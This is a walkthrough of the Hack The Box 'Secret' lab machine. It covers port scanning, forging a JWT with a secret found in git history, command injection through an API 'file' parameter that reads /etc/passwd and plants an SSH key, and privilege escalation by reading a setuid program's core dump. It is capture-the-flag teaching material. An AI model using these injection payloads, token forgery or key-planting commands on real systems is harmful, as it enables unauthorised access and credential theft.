# Secret Walkthrough

![secret](https://vato.cc/content/images/size/w2000/2022/02/secret.png)

## Let's first scan machine with nmap fast scan for finding open ports

### NOTE:- you are also able to use another port scanner totally depends on you.

```
sudo nmap -F -sV 10.10.11.120
```

### Result

```
PORT     STATE SERVICE VERSION 
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
80/tcp   open  http    nginx 1.18.0 (Ubuntu) 
3000/tcp open  http    Node.js (Express middleware)
```

## Now let's scan machines with found open ports i.e, our final scan

```
sudo nmap -A -O -v -p 22,80,3000 --script vuln 10.10.11.120
```

### Result

```
PORT     STATE SERVICE VERSION 
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 
| vulners:  
|   cpe:/a:openbsd:openssh:8.2p1:  
|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778 
|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3
*EXPLOIT* 
|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207
*EXPLOIT* 
|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062 
|       MSF:ILITIES/GENTOO-LINUX-CVE-2021-28041/        4.6     https://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-20
21-28041/       *EXPLOIT* 
|       CVE-2021-28041  4.6     https://vulners.com/cve/CVE-2021-28041 
|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617 
|       MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/     4.3     https://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE
-2020-14145/    *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP9-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP8-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/      4.3     https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULE
ROS-2_0_SP5-CVE-2020-14145/     *EXPLOIT* 
|       MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/   4.3     https://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/ *
EXPLOIT* 
|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145 
|       CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012 
|_      CVE-2021-36368  2.6     https://vulners.com/cve/CVE-2021-36368 
80/tcp   open  http    nginx 1.18.0 (Ubuntu) 
| http-enum:  
|_  /docs/: Potentially interesting folder 
|_http-server-header: nginx/1.18.0 (Ubuntu) 
| http-fileupload-exploiter:  
|    
|_    Couldn't find a file-type field. 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
3000/tcp open  http    Node.js (Express middleware) 
| http-fileupload-exploiter:  
|    
|_    Couldn't find a file-type field. 
| http-slowloris-check:  
|   VULNERABLE: 
|   Slowloris DOS attack 
|     State: LIKELY VULNERABLE 
|     IDs:  CVE:CVE-2007-6750 
|       Slowloris tries to keep many connections to the target web server open and hold 
|       them open as long as possible.  It accomplishes this by opening connections to 
|       the target web server and sending a partial request. By doing so, it starves 
|       the http server's resources causing Denial Of Service. 
|        
|     Disclosure date: 2009-09-17 
|     References: 
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750 
|_      http://ha.ckers.org/slowloris/ 
| http-enum:  
|_  /docs/: Potentially interesting folder 
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities. 
|_http-dombased-xss: Couldn't find any DOM based XSS. 
|_http-csrf: Couldn't find any CSRF vulnerabilities. 
```

## Here we found a web server and a nodejs server is running with same http-title. i.e, DUMB Docs. Now let's enemurating further.

## At the end of the website there is a button for downloading source code of ngnix server, let's download it. 
### Also start gobuster scan for finding web directories.

```
gobuster dir -u http://10.10.11.120:3000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error
```

### Result

```
=============================================================== 
2022/03/20 13:22:02 Starting gobuster in directory enumeration mode 
=============================================================== 
/download             (Status: 301) [Size: 183] [--> /download/] 
/docs                 (Status: 200) [Size: 20720]                
/assets               (Status: 301) [Size: 179] [--> /assets/]   
/api                  (Status: 200) [Size: 93]                   
/Docs                 (Status: 200) [Size: 20720]               
```

## here we find some directories, some important directories are /download for downloading sources code , /docs directory is installation guide, /api is live demo button.
### Going to the http://10.10.11.120/api/priv says Access is Denied because we are a not verified and this is expected according to the documentation.

![access-denied](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Secret/1access_denied.png)

## Now let's first enumerate the source code. In /routes/private.js we find a username theadmin. there also have 2 hidden files and directory too named .env and .git and in .env there is a token secret.

## After reviewing the source code let's make a attack plan:

### 1. Create a new user on the system as theadmin
### 2. Create a low level user
### 3. Update the JWT to be theadmin
### 4. Access to the restricted endpoints

## NOTE:- Use Documentaion for doing this 

## Let's Create a new user using curl .

```
curl -i -X POST -H 'Content-Type: application/json' -d '{"name":"villan", "email":"villan@dasith.works", "password":"whatispassword"}' http://10.10.11.120/api/user/register
```

### Result

```
HTTP/1.1 400 Bad Request 
Server: nginx/1.18.0 (Ubuntu) 
Date: Sun, 20 Mar 2022 09:17:07 GMT 
Content-Type: text/html; charset=utf-8 
Content-Length: 18 
Connection: keep-alive 
X-Powered-By: Express 
ETag: W/"12-bovfAO8maqeTuF6NiWgD46KUq3k"
```

## After Creating user now it's time to login and bypass the JWT validation.

## For login

```
curl -i -X POST -H 'Content-Type: application/json' -d '{"email":"villan@dasith.works", "password":"whatispassword"}' http://10.10.11.120/api/user/login
```

### Result

```
HTTP/1.1 200 OK 
Server: nginx/1.18.0 (Ubuntu) 
Date: Sun, 20 Mar 2022 09:27:26 GMT 
Content-Type: text/html; charset=utf-8 
Content-Length: 211 
Connection: keep-alive 
X-Powered-By: Express 
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjM2ZjM2ZWY0OTkwYjA0NWNjNTUxZjkiLCJuYW1lIjoidmlsbGFuIiwiZW1haWwiOiJ2aWxsYW5AZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3NzY4NDQ2fQ.a_q9NsYn9aQqCcI4DqHDVwjBxBSGGQaeAvabgCDQSGk 
ETag: W/"d3-WTwOMTPhrXWzwQ2uvVzMIz0JiiQ" 
 
   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjM2ZjM2ZWY0OTkwYjA0NWNjNTUxZjkiLCJuYW1lIjoidmlsbGFuIiwiZW1haWwiOiJ2aWxsYW5AZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3NzY4NDQ2fQ.a_q9NsYn9aQqCcI4DqHDVwjBxBSGGQaeAvabgCDQSGk
```
## using this https://jwt.io/ website we can modify our token , Now we know there is a token secret in .env. let's use that and modify our token. And try to access the system.

![wrong_secret](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Secret/wrong_secret.png)

```
curl -w '\n' -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjM2ZjM2ZWY0OTkwYjA0NWNjNTUxZjkiLCJuYW1lIjoidmlsbGFuIiwiZW1haWwiOiJ2aWxsYW5AZGFzaXRoLndvcmtzIiwiaWF0IjoxNjQ3NzY4NDQ2fQ.x0av6VGSlxO1ciE2QxA4VAffxCAUSZVf5SdRz6JHH20' http://10.10.11.120/api/priv
```

## But it shows invalid token that's mean someone change the secret token value you can see in the the .git HEAD file that token_secret is removed.
## Now, let's go back in time and check the value of old token using below command.

```
git diff HEAD~2
```

## After using this command in tree folder we get removed token value and name theadmin also. change the old value to new found value and modify jwt token.

![right_token](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Secret/correct_token.png)

## Now, let's try to acess the system.

```
curl -w '\n' -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjM2ZjM2ZWY0OTkwYjA0NWNjNTUxZjkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InZpbGxhbkBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDc3Njg0NDZ9.KveqKu9ClZqpisnK92Wq4y4meCJ82qc2VENMPZz2sIw' http://10.10.11.120/api/priv

```

## BOOMMM!!!! WE GOT ACCESS AS USER THEADMIN.

![celebrate](https://c.tenor.com/T7RBbkA7NMwAAAAC/celebration-fans.gif)

## Now let's get to the server, itâ€™s time to leverage the /api/logs endpoint to gain access to the server. The caveat is that the file GET parameter needs to be URL encoded for it to be accepted in curl.

```
curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjM2ZjM2ZWY0OTkwYjA0NWNjNTUxZjkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InZpbGxhbkBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDc3Njg0NDZ9.KveqKu9ClZqpisnK92Wq4y4meCJ82qc2VENMPZz2sIw' 'http://10.10.11.120/api/logs?file=index.js;id;cat+/etc/passwd' | sed 's/\\n/\n/g'
```

### notice space is replaced with + . The output is quite hard to decipher, to clean this up, pipe the output from curl into sed and replace \n with actual new line characters.

### Result

```
HTTP/1.1 200 OK 
Server: nginx/1.18.0 (Ubuntu) 
Date: Sun, 20 Mar 2022 11:04:18 GMT 
Content-Type: application/json; charset=utf-8 
Content-Length: 1998 
Connection: keep-alive 
X-Powered-By: Express 
ETag: W/"7ce-NxIlhcd24v8GLd4L3DTd0ONRpEo" 
 
"ab3e953 Added the codes 
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith) 
root:x:0:0:root:/root:/bin/bash 
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
bin:x:2:2:bin:/bin:/usr/sbin/nologin 
sys:x:3:3:sys:/dev:/usr/sbin/nologin 
sync:x:4:65534:sync:/bin:/bin/sync 
games:x:5:60:games:/usr/games:/usr/sbin/nologin 
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin 
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin 
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin 
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin 
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin 
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin 
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin 
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin 
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin 
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin 
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin 
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin 
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin 
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin 
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin 
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin 
syslog:x:104:110::/home/syslog:/usr/sbin/nologin 
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin 
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false 
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin 
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin 
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin 
pollinate:x:110:1::/var/cache/pollinate:/bin/false 
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin 
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin 
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin 
dasith:x:1000:1000:dasith:/home/dasith:/bin/bash 
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false 
mongodb:x:113:117::/var/lib/mongodb:/usr/sbin/nologin
```

## There dasith user running the application with a login shell. We know that we have ssh port open. For accessing the shell via ssh we  need to add an SSH public key to authorized_machines file of the users home directory.

### NOTE:- don't use your machines main SSH key. Always generate a new one.

## Use below command to genrate a new ssh public key.

```
ssh-keygen -t rsa -b 4096 -C 'villan@htb' -f secret -P ''
```

## before adding ssh key to system we need to ensure that system has .ssh/authorized_keys folder and file exists. Rather than manually checking, we can add commands that won’t overwrite any existing files or folders, but will create them if they don’t exist.

### for doing this first store the key in a bash variable.

```
export PUBLIC_KEY=$(cat secret.pub)
```

## Now using curl we can add key to the server.

```
curl -i -H 'auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MjM2ZjM2ZWY0OTkwYjA0NWNjNTUxZjkiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InZpbGxhbkBkYXNpdGgud29ya3MiLCJpYXQiOjE2NDc3Njg0NDZ9.KveqKu9ClZqpisnK92Wq4y4meCJ82qc2VENMPZz2sIw' -G --data-urlencode "file=index.js; mkdir -p /home/dasith/.ssh; echo $PUBLIC_KEY >> /home/dasith/.ssh/authorized_keys" 'http://10.10.11.120/api/logs'

```

## Explanation of the above command → -i = print headers, -G = sends data values using GET instead of POST, --data-urlencode = encode data parameters

### Result

```
HTTP/1.1 200 OK 
Server: nginx/1.18.0 (Ubuntu) 
Date: Sun, 20 Mar 2022 11:41:45 GMT 
Content-Type: application/json; charset=utf-8 
Content-Length: 27 
Connection: keep-alive 
X-Powered-By: Express 
ETag: W/"1b-pFfOEX46IRaNi6v8ztcwIwl9EF8" 
 
"ab3e953 Added the codes\n"
```

## Now let's access the server using ssh.

```
ssh -i secret dasith@10.10.11.120
```

# BOOOM!!!!! WE GOT SHELL AND ALSO USER HASH !!

![celebration](https://c.tenor.com/RdepuTw_kK0AAAAC/happy-dancing.gif)

## Now it's time for privilege escalation
### For priv esc our plan is to execute the program, have it read the file into memory, and then  crash the program. Cause a core dump will dump the contents of the applications memory to a file.

![core_dumped](https://raw.githubusercontent.com/SUNNYSAINI01001/HackTheBox/main/Secret/core_dumped.png)

## The core dump files are located at /var/crashes, and they can be unpacked using apport-unpack to view the data.

```
apport-unpack _opt_count.1000.crash /tmp/crash-report
```

## after using this command we got a error that show folder alredy exists and not empty. Now let's list the files in that directory. Here we got CoreDump file. let use 

```
strings /tmp/crash-report/CoreDump
```

### Result

```
CORE 
CORE 
count 
./count  
IGISCORE 
CORE 
ELIFCORE 
/opt/count 
/opt/count 
/opt/count 
/opt/count 
/opt/count 
/usr/lib/x86_64-linux-gnu/libc-2.31.so 
/usr/lib/x86_64-linux-gnu/libc-2.31.so 
/usr/lib/x86_64-linux-gnu/libc-2.31.so 
/usr/lib/x86_64-linux-gnu/libc-2.31.so 
/usr/lib/x86_64-linux-gnu/libc-2.31.so 
/usr/lib/x86_64-linux-gnu/libc-2.31.so 
/usr/lib/x86_64-linux-gnu/ld-2.31.so 
/usr/lib/x86_64-linux-gnu/ld-2.31.so 
/usr/lib/x86_64-linux-gnu/ld-2.31.so 
/usr/lib/x86_64-linux-gnu/ld-2.31.so 
/usr/lib/x86_64-linux-gnu/ld-2.31.so 
CORE 
 a file? [y/N]:  
//////////////// 
ile? [y/N]:  
LINUX 
 a file? [y/N]:  
//////////////// 
ile? [y/N]:  
/lib64/ld-linux-x86-64.so.2 
libc.so.6 
setuid 
exit 
readdir 
fopen 
closedir 
__isoc99_scanf 
strncpy 
__stack_chk_fail 
putchar 
fgetc 
strlen 
prctl 
getchar 
fputs 
fclose 
opendir 
getuid 
strncat 
__cxa_finalize 
__libc_start_main 
snprintf 
__xstat 
__lxstat 
GLIBC_2.7 
GLIBC_2.4 
GLIBC_2.2.5 
_ITM_deregisterTMCloneTable 
__gmon_start__ 
_ITM_registerTMCloneTable 
Unable to open directory. 
?????????? 
Total entries       = %d 
Regular files       = %d 
Directories         = %d 
Symbolic links      = %d 
Unable to open file. 
Please check if file exists and you have read privilege. 
Total characters = %d 
Total words      = %d 
Total lines      = %d 
Enter source file/directory name:  
%99s 
Save results a file? [y/N]:  
Path:  
Could not open %s for writing 
:*3$" 
Save results a file? [y/N]: words      = 2 
Total lines      = 2 
/root/root.txt 
206636107eb53b591870c69b04300626 
aliases 
ethers 
group 
gshadow 
hosts 
initgroups 
netgroup 
networks 
passwd 
protocols 
publickey 
services 
shadow 
CAk[S 
libc.so.6 
/lib/x86_64-linux-gnu 
libc.so.6 
uTi7J 
|F:m 
_rtld_global 
__get_cpu_features 
_dl_find_dso_for_object 
_dl_make_stack_executable 
_dl_exception_create 
__libc_stack_end 
_dl_catch_exception 
malloc 
_dl_deallocate_tls 
_dl_signal_exception 
__tunable_get_val 
__libc_enable_secure 
__tls_get_addr 
....
```

# BOOOMMM!!! WE GOT ROOT HASH TOO

![cele](https://c.tenor.com/HJ0iSKwIG28AAAAC/yes-baby.gif)

# NOTE:- If you want to get a root shell to do the samt with /root/.ssh/id_rsa .Crash the program, and use strings.You'll see the private key within the dump. Copy Paste on your system and access root shell. 

# DO IT YOURSELF !!!!!!!!!
